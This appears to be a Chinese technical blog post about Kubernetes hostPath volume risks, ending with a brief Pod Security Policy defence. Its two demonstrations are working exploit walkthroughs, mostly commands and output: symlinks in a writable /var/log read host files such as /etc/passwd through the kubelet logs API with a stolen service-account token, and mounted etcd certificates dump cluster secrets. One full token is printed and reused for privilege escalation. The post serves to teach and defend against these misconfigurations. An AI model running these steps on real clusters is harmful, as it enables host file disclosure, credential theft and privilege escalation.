---
title: k8s中的hostPath的安全隐患
tags:
  - kubernetes
categories:
  - 架构
date: 2022-02-08 17:34:46
updated: 2022-02-08 17:34:46
---


## 简介
挂载一个hostPath的volumes的时候，需要设置挂载方式为read only， 不然存在安全风险。

```
volumes:
- name: test-volume
  hostPath:
    path: /data
    type: Directory
这时定义hostpath的volume，定义的时候没有readonly选项。

volumeMounts:
- name: test-volume
  mountPath: /test-volume
  readOnly: true

```

在官方文档中有这么一段话

```
https://kubernetes.io/docs/concepts/storage/volumes/#hostpath

Warning:
HostPath volumes present many security risks, and it is a best practice to avoid the use of HostPaths when possible. When a HostPath volume must be used, it should be scoped to only the required file or directory, and mounted as ReadOnly.

```

简单讲就是在强调你在挂载hostpath的volume的时候必须设置readOnly，且必须约束可以挂载的目录。

设置readOnly是因为，已经证明存在一些方法来绕过约束。比如我配置了hostPath不能访问A目录，但是我可以通过挂载B目录间接访问A目录；或者我配置了hostPath只能访问A目录，但是我可以通过A目录，间接访问到B目录。是不是很神奇。

下面演示两个例子，来说明不设置readOnly和不约束可挂载目录所带来的隐患。

<!-- more -->

## 主机文件泄露

这个例子通过挂载一个特定的可写目录，来实现读取系统任何文件的目的。

```
# 首先创建一个pod挂载系统的/var/log目录
apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    run: busy
  name: busy
spec:
  containers:
  - image: busybox
    name: busy
    resources: {}
    args:
    - sh
    - -c
    - "sleep 1d"
    volumeMounts:
    - name: varlog
      mountPath: /var/log
      # readOnly: true
  dnsPolicy: ClusterFirst
  restartPolicy: Always
  volumes:
  - name: varlog
    hostPath:
      path: /var/log
      type: Directory
status: {}




~$ kl apply -f busy.yaml --force
pod/busy created
```

然后我们进到pod中查看该目录

```
~$ kl exec busy -it -- sh
/ # cd /var/log
/var/log # ls
...
```

显然我们是可以看到这个目录下的所有文件的，但是这个时候如果告诉你/var/log目录目前可写，然后希望借助这个目录读取到系统中的任何文件，然后你能想到方案吗，我想不是专业安全人员是不能想到这个方法的。

这个方法就是通过建立软连接：

```
/var/log # ln -s /etc/passwd passwd.log

/var/log # cat passwd.log 
......
```

我们尝试读passwd但是显然读到的是容器内的passwd，我们想要读到的是主机上的passwd。那怎么办呢？

关键的时候到了，我们先给当前用户配置一个读log的权限：

```
# 给当前sa配置日志相关的权限
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: getlog
rules:
- apiGroups:
  - ""
  resources:
  - nodes/log
  verbs:
  - get
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  creationTimestamp: null
  name: getlog
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: getlog
subjects:
- kind: ServiceAccount
  name: default
  namespace: default
# 经过测试用rolebinding不行，得用clusterrolebinding  
  
  
~$ kl apply -f roleset.yaml
clusterrole.rbac.authorization.k8s.io/getlog configured
clusterrolebinding.rbac.authorization.k8s.io/getlog configured
```

然后通过curl发起连接：

```
# 拿到sa的TOKEN
~$ kl get secret
NAME                          TYPE                                  DATA   AGE
...
default-token-5kd6c           kubernetes.io/service-account-token   3      18d
...

~$ TOKEN=$(kl get secret -n default default-token-5kd6c -o jsonpath='{.data.token}' | base64 -d)

# 拿到pod所在主机ip
~$ HOST=$(kl get pod busy -o jsonpath='{.status.hostIP}')

# 读取日志,指定passwd.log，我们刚才在容器中创建的软连接
~$ curl -k  https://$HOST:10250/logs/passwd.log --header "Authorization: Bearer $TOKEN"
......

```

神奇的事情发生了，我们读取到了主机中的文件。原理是当我们通过curl访问kubelet时，kubelet会去读取容器中创建的软连接，并解析到主机上的文件中去，从而导致主机的文件内容泄露。

我们还可以更进一步，直接在pod内就可以去读主机的文件。

```
# 先进到pod中
~$ kl exec busy -it -- sh
/ # 

# 然后创建脚本
/ # vi readfile.sh 
ln -s -f / /var/log/hostroot

HOST=$(route | grep default | awk -F' ' '{print $2}')
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
wget -qO- --header "Authorization: Bearer $TOKEN" https://$HOST:10250/logs/hostroot$1


# 然后就可以读文件以及列目录了
/ # sh readfile.sh /etc/passwd
wget: note: TLS certificate validation not implemented
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
......


/ # sh readfile.sh /tmp/
wget: note: TLS certificate validation not implemented
<pre>
<a href=".ICE-unix/">.ICE-unix/</a>
<a href=".Test-unix/">.Test-unix/</a>
......
```

## 集群数据泄露

再来看另一种利用方法, 这种方法是用hostPath挂载/etc/kubernetes/pki/etcd，然后连接etcd读取数据。

etcd中存了集群的所有数据，所以能读到token，从而导致低权限用户权限提升，带来隐患。

```
# 这里需要hostPath和hostNetwork:true和nodeName:server1配合使用
~$ vi etcdctl.yaml 
apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    run: etcdctl
  name: etcdctl
spec:
  containers:
  - image: anonoz/etcdctl-arm64
    name: etcdctl
    command:
    - sleep
    - 1d
    env:
    - name: ETCDCTL_API
      value: "3"
    resources: {}
    volumeMounts:
    - mountPath: /etc/kubernetes/pki/etcd
      name: etcd-certs
  nodeName: server1
  dnsPolicy: ClusterFirst
  restartPolicy: Always
  hostNetwork: true
  volumes:
  - name: etcd-certs
    hostPath:
      path: /etc/kubernetes/pki/etcd
      type: Directory
status: {}

~$ kl apply -f etcdctl.yaml 
```

随后连到pod中读取secret数据。

```
~$ kl exec etcdctl -it -- sh
/ # etcdctl --endpoints 127.0.0.1:2379  --cert=/etc/kubernetes/pki/etcd/server.crt  --key=/etc/kubernetes/pki/etcd/server.key  --cacert=/etc
/kubernetes/pki/etcd/ca.crt get '' --from-key --keys-only | grep secret
...
/registry/secrets/kube-system/job-controller-token-klrfg
/registry/secrets/kube-system/kube-proxy-token-md447
/registry/secrets/kube-system/metrics-server-token-vmnrm
/registry/secrets/kube-system/namespace-controller-token-nmvqq
/registry/secrets/kube-system/node-controller-token-6rlxz
...

# 我们随便拿一个secret中的token值来用
# 这个命令会返回一段格式有点乱的内容，但是能清晰的分辨出token的内容。
/ # etcdctl --endpoints 127.0.0.1:2379  --cert=/etc/kubernetes/pki/etcd/server.crt  --key=/etc/kubernetes/pki/etcd/server.key  --cacert=/etc
/kubernetes/pki/etcd/ca.crt get /registry/secrets/kube-system/node-controller-token-6rlxz
...
token?eyJhbGciOiJSUzI1NiIsImtpZCI6InpXaFVvaWdSU19Pbmo5dnUtOGFTWVQ1bjIzYkptWmFpX2Q1VFBuT2EtZTAifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJub2RlLWNvbnRyb2xsZXItdG9rZW4tNnJseHoiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoibm9kZS1jb250cm9sbGVyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiNDU4MDljM2QtNTNiNS00ZWI5LTk1MTAtNjExOGZmZjY4ZDk0Iiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOm5vZGUtY29udHJvbGxlciJ9.N8QgQCjv22oE22ct--ib-2A74GaLPkQ6ka1xDysphhljeItSSat1gQRtBawgoF-vuj1a55pdLLPDva9L7sQzG-EaFVUaFBenDeJgOF-vM1LzIqAEmIw4K4IlHKPQNRXi678cJ7mR-R-Iufj9dpOl5zKMS7p_4RydXr8EhfaxgBwqYJkOdQNWIcfPhYM1xiVIplIFKs61Vf0sU1NnSeXJy3WTUqimn_i-d_E5TUMp9_hlIn6iHR4U5UwkGboxFBtfhc0KDn24ShbshpTaM6d6LKJQzrTwTmBwMK2pw0rEfJTKK_Q-3xHlEfF3bj2rcOtrQNylOAVtvggX_elqwXlelQ#kubernetes.io/service-account-token"

# 离开pod
# 设置token到kubeconfig中并查看这个token的全部权限
~$ kl config set-credentials tokenfrometcd --token xxx
User "tokenfrometcd" set.
~$ kl config set-context tokenfrometcd --cluster kubernetes --user tokenfrometcd
Context "tokenfrometcd" created.
~$ kl --context=tokenfrometcd auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names          Verbs
events                                          []                                    []                      [create patch update]
events.events.k8s.io                            []                                    []                      [create patch update]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []                      [create]
......
```

## 其他方法
其他方法还有，这个视频演示了其中的两种：
```
https://www.youtube.com/watch?v=HmoVSmTIOxM
```

这个repo列了系统的一些可以利用的敏感数据：

```
https://github.com/BishopFox/badPods/tree/main/manifests/hostpath
```



## 防御方法

防御的方法是在psp中添加约束：

```
https://kubernetes.io/docs/concepts/policy/pod-security-policy/#volumes-and-file-systems

allowedHostPaths:
- pathPrefix: "/foo"
  readOnly: true # only allow read-only mounts
```



## 参考
[Volumes and file systems](https://kubernetes.io/docs/concepts/policy/pod-security-policy/#volumes-and-file-systems)
[The Path Less Traveled: Abusing Kubernetes Defaults](https://www.youtube.com/watch?v=HmoVSmTIOxM)
[hostPath](https://kubernetes.io/docs/concepts/storage/volumes/#hostpath)
[Bad Pod #4: Unrestricted hostPath](https://github.com/BishopFox/badPods/tree/main/manifests/hostpath)
